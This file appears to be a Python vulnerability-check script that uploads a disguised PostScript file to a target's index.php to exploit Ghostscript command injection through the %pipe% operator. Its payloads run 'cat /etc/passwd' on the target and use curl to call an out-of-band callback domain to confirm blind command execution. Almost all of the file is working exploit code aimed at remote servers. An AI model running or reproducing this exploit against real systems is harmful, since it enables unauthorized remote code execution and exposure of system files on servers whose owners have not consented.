import requests,re,urllib3,time
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
f1=randomLowercase(5)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
f2=randomLowercase(10)

def scan(baseurl):
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"index.php"
		body='''------WebKitFormBoundaryukZmnyhO\r
Content-Disposition: form-data; name="file_upload"; filename="'''+f1+'''.jpg"\r
content-Type="image/png"\r
\r
%!PS\r
0 1 300367 {} for\r
{save restore} stopped {} if\r
(%pipe%cat /etc/passwd > /tmp/'''+f2+''' && cat /tmp/'''+f2+''') (w) file\r
------WebKitFormBoundaryukZmnyhO--\r'''
		headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and re.search("root:[x*]:0:0:",response.text):
			r1=True
		else:
			r1=False
	except:
		r1=False
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"index.php"
		gets=get_domain()
		domain=gets[0]
		token=gets[1]
		cmd="curl http://" + domain + " > /tmp/curltest"
		body='''------WebKitFormBoundaryukZmnyhO\r
Content-Disposition: form-data; name="file_upload"; filename="'''+f1+'''.jpg"\r
content-Type="image/png"\r
\r
%!PS\r
0 1 300367 {} for\r
{save restore} stopped {} if\r
(%pipe%'''+cmd+''') (w) file\r
------WebKitFormBoundaryukZmnyhO--\r'''
		headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		time.sleep(2)
		if response.status_code == 200 and get_result(domain,token):
			r2=True
		else:
			r2=False
	except:
		r2=False
	if r1 or r2:
		return True
	else:
		return False
